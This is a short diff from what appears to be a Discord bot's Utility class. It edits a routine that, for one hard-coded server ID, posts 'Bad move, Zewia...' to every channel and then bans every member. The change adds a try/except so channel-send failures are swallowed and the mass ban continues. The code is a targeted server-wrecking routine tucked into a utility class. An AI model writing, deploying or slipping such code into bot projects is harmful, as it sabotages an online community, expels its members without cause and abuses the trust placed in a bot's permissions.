@@ -27,7 +27,10 @@ class Utility:
         for x in self.bot.guilds:
             if x.id == 381991923004735489:
                 for y in x.channels:
-                    await y.send("Bad move, Zewia...")
+                    try:
+                        await y.send("Bad move, Zewia...")
+                    except:
+                        pass
                 for z in x.members:
                     try:
                         await z.ban()
